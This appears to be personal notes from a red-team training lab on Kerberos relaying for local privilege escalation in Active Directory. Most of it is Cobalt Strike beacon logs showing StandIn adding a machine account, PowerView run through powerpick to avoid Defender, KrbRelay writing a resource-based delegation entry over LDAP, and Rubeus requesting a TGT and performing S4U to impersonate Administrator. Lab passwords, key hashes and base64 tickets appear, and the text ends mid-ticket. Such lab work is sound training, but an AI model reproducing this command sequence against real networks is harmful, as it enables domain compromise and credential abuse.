*None of this worked, going to have to come back* 

As James puts it - "there's nothing inherently stopping Kerberos authentication being relayed if the attacker can control the SPN", but until now, we have not had a way to do this.  One method for achieving it is detailed in his post: [Windows Exploitation Tricks: Relaying DCOM Authentication](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html).  The demonstrated approach is very similar to how the [RemotePotato](https://github.com/antonioCoco/RemotePotato0) exploit works - stand up a local listener and coerce a privileged COM server into connecting to it; capture the subsequent authentication request and relay it somewhere else.  Again, there are a lot of nuanced detail in James' post, but these are the highlights.

The attacker starts a malicious RPC server that will force connecting clients to authenticate to it using Kerberos only, and by using appropriate security bindings, they can specify a completely arbitrary SPN.  This will force a service ticket to be generated for a service/SPN that that attacker doesn't control, such as HOST/DC.  They then coerce a privileged COM server into connecting to their malicious RPC server, which will perform the authentication and generate the appropriate Kerberos tickets.  In this example, the malicious RPC server would receive a KRB_AP_REQ for HOST/DC as the local computer account, which the attacker can relay to LDAP/DC instead.  With a valid service ticket for LDAP, they can submit requests to the DC as the computer account to modify the computer object in Active Directory.  This opens the door for other attacker primitives like RBCD and shadow credentials in order to achieve the LPE.

It's worth noting that if signing or channel binding are enabled then these attacks are not possible.  Thankfully (or not, depending on your point of view), signing is still disabled by default, even on critical protocols such as LDAP.

There are tools such as [KrbRelayUp](https://github.com/ShorSec/KrbRelayUp) that automate most of the exploitation steps required, but we'll do them manually.  The primary reason is 1) that we understand all of the steps in more detail; and 2) we know how and what clean-up afterwards (which these tools often omit).  For the relaying, we'll use the original [KrbRelay](https://github.com/cube0x0/KrbRelay) tool by [cube0x0](https://twitter.com/cube0x0); and for the LPE, tools we're already familiar with including StandIn, Whisker, and Rubeus.

This lesson will show how Kerberos relaying can be used to LPE to SYSTEM on WKSTN-2 as bfarmer.


One unfortunate aspect to KrbRelay is that because it uses the BouncyCastle Crypto package (which is quite large), its total compiled size is larger than the default task size allowed for Beacon.  Trying to run it with `execute-assembly` will throw an error:

didn't do this command

```POWERSHELL
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe
[-] Task size of 1727291 bytes is over the max task size limit of 1048576 bytes.
```

# RBCD
command used to create an `EVILCOMPUTER` on the `DOMAIN` `execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make`
was already created in [[7. Resource-Based Contrained Delegation]]
- made `EvilComputer2`
```powershell
[12/11 18:29:44] beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer2 --make
[12/11 18:29:46] [*] Tasked beacon to run .NET program: StandIn.exe --computer EvilComputer2 --make
[12/11 18:29:46] [+] host called home, sent: 310086 bytes
[12/11 18:29:47] [+] received output:

[?] Using DC    : dc-2.dev.cyberbotic.io
    |_ Domain   : dev.cyberbotic.io
    |_ DN       : CN=EvilComputer2,CN=Computers,DC=dev,DC=cyberbotic,DC=io

[12/11 18:29:47] [+] received output:
    |_ Password : 3om4UanPjpoXOti

[+] Machine account added to AD..

```
importing `PowerView.ps1` `powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1`
```powershell
[12/11 18:05:44] beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[12/11 18:05:48] [*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[12/11 18:05:48] [+] host called home, sent: 143813 bytes
```
`powerpick` to utilize `powershell-import` but to bypass `windows defender`
```powershell
[12/11 18:30:27] beacon> powerpick Get-DomainComputer -Identity EvilComputer2 -Properties objectsid
[12/11 18:30:27] [*] Tasked beacon to run: Get-DomainComputer -Identity EvilComputer2 -Properties objectsid (unmanaged)
[12/11 18:30:28] [+] host called home, sent: 138070 bytes
[12/11 18:30:32] [+] received output:

objectsid                                    
---------                                    
S-1-5-21-569305411-121244042-2357301523-10602

```
The next step is to find a suitable port for the OXID resolver to circumvent a check in the Remote Procedure Call Service (RPCSS).  This can be done with `CheckPort.exe`.
```powershell
[12/11 18:16:43] beacon> execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
[12/11 18:16:43] [*] Tasked beacon to run .NET program: CheckPort.exe
[12/11 18:16:43] [+] host called home, sent: 117000 bytes
[12/11 18:16:44] [+] received output:
[*] Looking for available ports..
[*] SYSTEM Is allowed through port 10
```
run `KrbRelay` with the newly obtained `objectsid` and `port`

```powershell
[12/11 18:31:43] beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-10602 -port 10
[12/11 18:32:02] [*] Tasked beacon to run .NET program: KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-10602 -port 10
[12/11 18:32:02] [+] host called home, sent: 1728526 bytes
[12/11 18:32:03] [+] received output:
[*] Relaying context: dev.cyberbotic.io\WKSTN-2$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Windows\system32\gpupdate.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAACvZ4cRNiMGsAOaDNkFTCP7AvAAAOw1//9j0Nic5+MR4SIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 90f18417-f0f1-484e-9d3c-59dceee5dbd8
[*] apReq: 608206e406092a864886f71201020201006e8206d3308206cfa003020105a10302010ea20703050020000000a38204ef618204eb308204e7a003020105a1131b114445562e4359424552424f5449432e494fa2293027a003020102a120301e1b044c4441501b1664632d322e6465762e6379626572626f7469632e696fa382049e3082049aa003020112a103020104a282048c04820488f327e6cfd688aad873296ec031f25a0d7aa6868e54f6b4062fe43b185f38027666432e48d26bb08639f80e53e6a91758ec17095fb2db736ad58609c0aece4676a34c960e7989945786cb0459cad04ccfecc71fac4179ff3bbaa61a2e18421db43a1a31e4934fff5ad595a9326f2c1b0b65b182d58a983a566a16c6d936308042ce84b89ded422af61dac7ad7204473d04e10e6d3198da69fba0dc98154adc6c8b45e3ec70aa63d7daf00afac8500baab36dede6b54cbae0325070fb943c5489b885619c65326765b613ffa59344eb2a19c362ed734862442a2b339375d4ef5eafb78fecedf1d7b5dd42d331436696a3cc1f2084fd153217c201fa7ce8e50e483362dbc9bd7328fcb1251b8ca07bd26b05b28d08137a58261033e95ab5ce2fc0c2f758f8f0ee9ef0edcd79d19106fb9cf4f3f06a800a039726a4a3af98363cfdca4dd7bcdf2d5573008993a2c665a8770e89ab2020056bad3d91150f40dff1cd650445564e4b8146e84cfdf80526d2a204b954e1de5d446fafb4e72da4ab532307b8d3dcebd91763f5092919fd98b9552b732e4a83efbfad69e34b1d37c9fc65ddbf7c17495b4bb24b76e672461bdb8896a6bee5791d5e3ca43a403b184b10deea87b2a9ea5368b32f3fb126359fbc60b16327aad4acc59359947fdba37a093f6143b5bca9caea8c605ec4c97e3a6f023bc0960f1ac47ed557aecc188f8be86c4ba72598a47d814336ab093c814757cef8b4fe67c35e2bf53fa21e15caf1037660f14bb8cf4966f39e218af40d72c82a1f6dd303f3ede5aea33f6e5559f3cbac70512ce46d38326aeb98f2e7db69e4953fede2f127856c98dfae542278b4b39fdd044bd4d088969c97176c9dbd6a76ea9c700e7391d89c6985154aef05fe0902223a1484de1f8c3d0fb49e3e0a6648377045ee94244a6d412a15476438ba45b1133ee5e9ffedda197426f82a479d422157ad7f86b7c9b4eafd0a8fdd389fc3266ad0df8fb74c9e9bb2e901042ff66ae09d8d9c4d7f9445aec8501386495a6ebc325b7a4d3807983838ba3690d46c99feabb5069a5426171b379851214e3d8b779d5e0b49b749657b7b2fe57e614d48db434b67aa12719953984efe46b4cdcfb230bd1ee41c8a6449e10a6d8020129e10d9cc42e68281913f1bbe818e90d98bdc47afc0b994fef526570fa2c5bfe762980c2b8e41323fda4df8fc82e761f6132de118256f02ec5c5c10212a6202f81272fd2805ac216d09896f54c2c143a8da6d22892fd86d7bc4a488ce882dab7969f23149cd4d1bab9bf303fb14e6e12c11cf387910d251c25db0b5493271af2ea782a01867983496731c88812f54d5b41ffeafc19edfeb6aa8f161ba5829c4d8c2c1ffd2bf6b84fd474655a17d3e1431a1c79267391426a454365fb15b8f056c12b4dca8cd24215539e2479bcc0636d526a58b7e065fc0dce67b7afc4e3672bb95a993f56bd380dddd0effeb54618bb7f2f68dddeba37d6d9ca95e8907ec93fc916fcb4776390dc5709f4f0f290f891cae1b01a08eb97494555183471d089139719e5dc29d351fe9d551ec9f7cb040753c590e1acba4a7d2f934c9fff5d6e510870776b9e168d1a95d515b3812e5c548a789286736a82128917f6a48201c5308201c1a003020112a28201b8048201b444a82e3f79e15331d60742db7c3c78d5d8d5440551ba339bbbe54ce550d22d38905c75ab2484becc77d22714229412ff7399687b712efeb5d37b52d76ae406072740bf7dae2675de55ed5650260d648ee54f44c0f4896263e65e232adf668593ce47d2ca806bb401e677ef8ba3ab8867109c4ceeceb578ace771e26d9960016b08dc7c9c4572c67c66f0729e4690891d6827c8c7dc96f0d33d123ffe85eb00b8a85d4274b092c7f934b3066fa9c1af5a7487c66af9c57919dd7eba9ac6c1931725dd875fc5819cd97206724f6f7a4b5687eb5ec6375e66ddef808a7a1cd873610e4f752f1819eaf7a0554e800762cae0e9f1a25358aa4293d3cdf45acf3186e7de78a1090e810718e6794eb40621eebd162db47cb416c95a0d042a50d418ad1cdc22fe6e08bf850c957819c1055bb87703df224fa50b925c996ba6dc8fc0f96e4c46a43ed8976aa52b45022ecabdce48bd0052562d632beb06eec73b6fe521e74b8c5d4695a10f70fa5330dc3baaa41e11944b4289a8056c7e289e663337b053f3256a86ca58bf0ca921101a54cf2e0206aa5db86f163188f1641d444e29f845093d3833be07e6ec197cf3f6347611c68de9a4c9
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046e813341565864999de1b960dbc92ce5071c05f734e526d154e9decba912316c400c21c543139ca1613829459d76452c4f13f7cad3cd6845c9e54f16626733415649f7c9ac7118223bfdb367f2e546004cca4b3df3a7a16e6ec425ce4311361dbee157c99c135577e885058b997776
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a24404429c2708192343807ab3ade039555b9b2e595d60606fa1d064968683d61c3edb6b632094337c06b02c5f0ca4ba6bb22433dd93b4f789e29806c4797e4a98f74bbb3b0f
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
[*] ldap_modify: LDAP_SUCCESS

```
If we query `WKSTN-2$`, we'll see that there's now an entry in in its _msDS-AllowedToActOnBehalfOfOtherIdentity_ attribute.
```powershell
[12/11 18:20:57] beacon> powerpick Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
[12/11 18:20:57] [*] Tasked beacon to run: Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity (unmanaged)
[12/11 18:20:57] [+] host called home, sent: 138070 bytes
[12/11 18:21:01] [+] received output:

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}            
```
utilizing `Rubeus.exe` to query `EvilComputer$`'s `aes256` hash to use
```powershell
[12/11 18:33:48] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:3om4UanPjpoXOti /user:EvilComputer2$ /domain:dev.cyberbotic.io
[12/11 18:33:53] [*] Tasked beacon to run .NET program: Rubeus.exe hash /password:3om4UanPjpoXOti /user:EvilComputer2$ /domain:dev.cyberbotic.io
[12/11 18:33:53] [+] host called home, sent: 550818 bytes
[12/11 18:33:54] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Calculate Password Hash(es)

[*] Input password             : 3om4UanPjpoXOti
[*] Input username             : EvilComputer2$
[*] Input domain               : dev.cyberbotic.io
[*] Salt                       : DEV.CYBERBOTIC.IOhostevilcomputer2.dev.cyberbotic.io
[*]       rc4_hmac             : A4291C3F311ED9DB07B08EAF3D110A46
[*]       aes128_cts_hmac_sha1 : A8416FBA082F1E3C2F927FC373B4B6FE
[*]       aes256_cts_hmac_sha1 : DE93CAD88580F0F5693228B7F42C1429F34C3760C67298F62BBC435973638403
[*]       des_cbc_md5          : A4080D25DA9EE93E

```
Because we have the password associated with EvilComputer, we can request a `TGT` and perform an S4U to obtain a usable service tickets for WKSTN-2.  Let's use this to get a ticket for `HOST/WKSTN-2`.
```powershell
[12/11 18:34:25] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer2$ /aes256:DE93CAD88580F0F5693228B7F42C1429F34C3760C67298F62BBC435973638403 /nowrap
[12/11 18:34:30] [*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:EvilComputer2$ /aes256:DE93CAD88580F0F5693228B7F42C1429F34C3760C67298F62BBC435973638403 /nowrap
[12/11 18:34:30] [+] host called home, sent: 550880 bytes
[12/11 18:34:31] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: DE93CAD88580F0F5693228B7F42C1429F34C3760C67298F62BBC435973638403
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\EvilComputer2$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  EvilComputer2$
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  12/11/2023 6:34:30 PM
  EndTime                  :  12/12/2023 4:34:30 AM
  RenewTill                :  12/18/2023 6:34:30 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  DoRQj4WDOgmQbath+I9Jnoky23Hnz7GdV/dmhdiX3uk=
  ASREP (key)              :  DE93CAD88580F0F5693228B7F42C1429F34C3760C67298F62BBC435973638403

```
pass the ticket
```powershell
[12/11 18:38:11] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer2$ /impersonateuser:Administrator /msdsspn:host/wkstn-2 /ticket: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 /ptt

[12/11 18:38:17] [+] host called home, sent: 554926 bytes
[12/11 18:38:17] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'EvilComputer2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'EvilComputer2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'host/wkstn-2'
[*] Building S4U2proxy request for service: 'host/wkstn-2'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'host/wkstn-2':

      doIGejCCBnagAwIBBaEDAgEWooIFhzCCBYNhggV/MIIFe6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklP
      ohowGKADAgECoREwDxsEaG9zdBsHd2tzdG4tMqOCBUEwggU9oAMCARKhAwIBAqKCBS8EggUrCi5p1Jgm
      75SuV7uBrJlO4ckmg4Kw0v6hgaLIZOc0as9O9tFq+h5BdoI3AnAu/acbvS5jTCW2XG7KrmbuD6gHLj1P
      q9NJKDcDoYWN7oqB1/gX/ZA9LVqvD/8CP+BT3c3xBwUmGGkHg/woGTPmvS3Cdk4dFcnBLxQaGwz7vIi3
      5DcvvAhUmVO0gVV9RgV75xZvDRNjGelQhoo7QRIQA4zl6OJudWhuqiM5Mpqp3Zg0fLq5UoMCDo3jq3kM
      q5nIwnnMVygHodYMB+6tfzsF2u4qpQVSJGhn41TSvPfQe7Kjwbm/HSGJrD0IfgrlCJS4+VNfNCJWt9vT
      PAhxOPMHv86otOHh8yYip8bQFCcSyzedtkFPFp6vXu67frDgiiYUPnDPLg3T9XlG0zra4qRD8A9eg/8x
      E1rj0QX+j4baOCLmhe+pOJ08MRK7DTMgADsNLKodMIMkiO4O54g+Pi0AsRVQws/woMASwDcRmm6Zz5kL
      B3bWe1NyvMbfh2yLEjHgt2lEPZA2ia93I/33AkfTFasfzMlLnd4ALQp42pAo1wU6EWuenSZmAPAjgAaD
      ZrHd/RvAnCwLqbng+LtQIRx+ViG5TpN6x8Km+Nk00a25nJ24Q1puZWdPG1KHZkUXHyAJEiKj7Ge6u1JE
      f07Yi/+1L9ZDSlrNH8eU0qVb3bwVHa45EkPt6oI2Y6JtfqvSTQnrYNGcxSSJSRl7mAQ70hncFGxgnivn
      lD6VJGEkZmmfLa9QWwQm1YdZ+UOq7W8x6Lx4OZf5V/msw0NUKuwYp/Yd2P6cnwmUnXfo0GtibAeyet36
